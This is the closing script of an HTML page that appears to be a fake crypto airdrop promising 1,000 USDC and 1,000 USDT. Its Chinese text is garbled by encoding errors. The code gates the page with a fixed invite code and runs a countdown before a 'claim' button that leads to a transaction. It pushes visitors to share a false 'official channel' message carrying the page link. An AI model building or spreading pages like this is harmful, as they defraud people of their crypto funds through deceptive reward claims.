                        document.getElementById('claimButton').disabled = false;
                        document.getElementById('claimButton').innerHTML = '<i class="fas fa-bolt"></i> æ¿€æ´» USDC & USDT å¥–åŠ±';
                    }
                }, 300);
            };
        })();

        function validateInviteCode() {
            const code = document.getElementById('inviteCodeInput').value.trim();
            if (!code) return showStatus('âŒ è¯·è¾“å…¥é‚€è¯·ç ', 'error', document.getElementById('authStatus'));
            if (code !== CONFIG.FIXED_CODE) return showStatus('âŒ é‚€è¯·ç æ— æ•ˆ', 'error', document.getElementById('authStatus'));
            document.getElementById('authContainer').style.display = 'none';
            document.getElementById('mainContainer').style.display = 'block';
            setTimeout(startCountdown, CONFIG.DELAY_BEFORE_COUNTDOWN);
        }

        function showThankYou(tx) {
            clearInterval(countdownInterval);
            document.getElementById('txHashShort').textContent = `äº¤æ˜“å“ˆå¸Œï¼š${tx.slice(0,10)}...${tx.slice(-4)}`;
            document.getElementById('txLink').href = `https://etherscan.io/tx/  ${tx}`;
            document.getElementById('mainContainer').style.display = 'none';
            document.getElementById('thankYouContainer').style.display = 'block';
        }

        function handleShare() {
            const text = `ğŸš€ æˆ‘æ¿€æ´»äº† 1,000 USDC + 1,000 USDT ç©ºæŠ•ï¼\nå®˜æ–¹é€šé“ï¼š${location.href}`;
            if (navigator.share) navigator.share({ title: 'å¥–åŠ±å·²æ¿€æ´»ï¼', text });
            else navigator.clipboard?.writeText(text).then(() => showStatus('âœ… å·²å¤åˆ¶', 'success'));
        }

        document.addEventListener('DOMContentLoaded', () => {
            for (let i = 0; i < 30; i++) {
                const p = document.createElement('div');
                p.className = 'particle';
                p.style.cssText = `left:${Math.random()*100}%;top:${Math.random()*100}%;width:${Math.random()*6+2}px;height:${Math.random()*6+2}px;opacity:${Math.random()*0.7+0.2};animation:float ${10+Math.random()*20}s linear infinite;animation-delay:-${Math.random()*20}s;`;
                document.getElementById('particles').appendChild(p);
                if (i === 0) {
                    const s = document.createElement('style');
                    s.textContent = `@keyframes float{0%{transform:translateY(0)translateX(0)rotate(0deg);opacity:0}10%{opacity:0.4}90%{opacity:0.4}100%{transform:translateY(-100vh)translateX(${(Math.random()-0.5)*200}px)rotate(${Math.random()*360}deg);opacity:0}}`;
                    document.head.appendChild(s);
                }
            }

            document.getElementById('inviteCodeInput').addEventListener('keypress', e => e.key === 'Enter' && validateInviteCode());
            document.getElementById('submitCodeBtn').addEventListener('click', validateInviteCode);
            document.getElementById('shareBtn').addEventListener('click', handleShare);
            document.getElementById('finalShareBtn').addEventListener('click', handleShare);
        });
    </script>
</body>
</html>
